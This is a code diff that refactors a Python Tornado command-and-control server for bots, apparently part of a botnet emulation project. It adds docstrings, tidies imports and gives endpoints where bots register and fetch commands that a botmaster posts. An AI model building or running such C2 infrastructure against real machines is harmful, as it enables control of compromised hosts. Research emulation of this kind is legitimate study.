@@ -1,20 +1,30 @@
 #!/usr/bin/env python2.7
 # coding=UTF-8
-import logging, time, string, json, sys
+"""This file implements a CnC-Server that presents a web interface over which it can issue commands to bots
+and keep track of bots that register themselves regularly with the server. A command may be any method that
+is defined in Bot_Commands.py. This method will be executed by all bots that fetch it.
+All handler support plain text and json output."""
+
+import json
+import logging
+import string
+import sys
+import time
 import tornado.web
-from tornado.ioloop import IOLoop
 from threading import Thread
+from tornado.ioloop import IOLoop
 
 from AbstractBot import Runnable
-import emu_config
+from resources import emu_config
 from utils.NetworkUtils import NetworkAddressSchema
 
+
+# TODO: Remove plain text output
+
 def make_app():
-    return tornado.web.Application([
-        ("/", MainHandler),
-        ("/register", RegisterHandler),
-        ("/current_command", CurrentCommandHandler)
-    ], autoreload=True)
+    """Starts the web interface that is used to interact with this server."""
+    handlers = [("/", MainHandler), ("/register", RegisterHandler), ("/current_command", CurrentCommandHandler)]
+    return tornado.web.Application(handlers, autoreload=True)
 
 
 class BotInformation(object):
@@ -25,10 +35,18 @@ class BotInformation(object):
 
 class MainHandler(tornado.web.RequestHandler):
     def get(self):
-        self.write("I am a CnC server")
-
+        if "json" in string.lower(self.request.headers.get("Accept")):
+            self.set_header("Content-Type", "application/json")
+            self.write(json.dumps(tornado.web.Application.handlers))
+        else:
+            self.write("This server offers the following functions:\n"
+                       "/register where bots can register themselves so we can keep track of them."
+                       "/current_command where bots can retrieve commands that they should execute")
 
 class CurrentCommandHandler(tornado.web.RequestHandler):
+    """A handler that lets bots fetch the current command via HTTP GET and lets the botmaster issue a new command via
+    HTTP POST."""
+
     current_command = {}
 
     def get(self):
@@ -55,6 +73,8 @@ class CurrentCommandHandler(tornado.web.RequestHandler):
 
 
 class RegisterHandler(tornado.web.RequestHandler):
+    """Bots can register via HTTP POST, the number of currently known bots can be retrieved via HTTP GET"""
+
     registered_bots = dict()
 
     def get(self):
@@ -77,6 +97,8 @@ class RegisterHandler(tornado.web.RequestHandler):
 
 
 class CnCServer(Runnable):
+    """Allows the CnCServer to be run in its own thread."""
+
     def __init__(self, name=""):
         Runnable.__init__(self, name)
 
